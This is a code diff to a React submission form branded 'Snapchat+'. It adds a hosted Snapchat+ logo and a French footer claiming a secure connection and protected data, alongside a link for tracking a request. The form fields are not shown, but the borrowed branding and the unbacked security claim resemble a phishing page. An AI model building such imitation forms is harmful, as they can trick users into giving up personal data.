@@ -64,12 +64,12 @@ export default function SubmissionForm({ onSubmit, loading }) {
       className="w-full max-w-sm mx-auto"
     >
       {/* Card */}
-      <div className="bg-[#1a1a2e] border border-white/10 rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
+      <div className="bg-background border border-white/10 rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
 
         {/* Logo */}
         <div className="flex flex-col items-center mb-5">
-          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
-            <span className="text-3xl">👻</span>
+          <div className="w-16 h-16 rounded-2xl overflow-hidden mb-4 shadow-lg shadow-primary/30">
+            <img src="https://media.base44.com/images/public/6a26f9f976c66281507ebfba/9b266cad6_plus.png" alt="Snapchat+" className="w-full h-full object-cover" />
           </div>
           <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
             Snapchat<span className="text-primary">+</span>
@@ -224,6 +224,7 @@ export default function SubmissionForm({ onSubmit, loading }) {
         </p>
       </div>
 
+
       {/* Bottom links */}
       <div className="mt-4 text-center space-y-2">
         <button className="text-muted-foreground/60 text-xs flex items-center gap-1 mx-auto hover:text-muted-foreground transition-colors">
@@ -233,6 +234,11 @@ export default function SubmissionForm({ onSubmit, loading }) {
           Suivre l'état de ma demande →
         </button>
       </div>
+
+      {/* Security footer */}
+      <p className="text-muted-foreground/40 text-xs text-center mt-6">
+        🔒 Connexion sécurisée • Données protégées
+      </p>
     </motion.div>
   );
 }
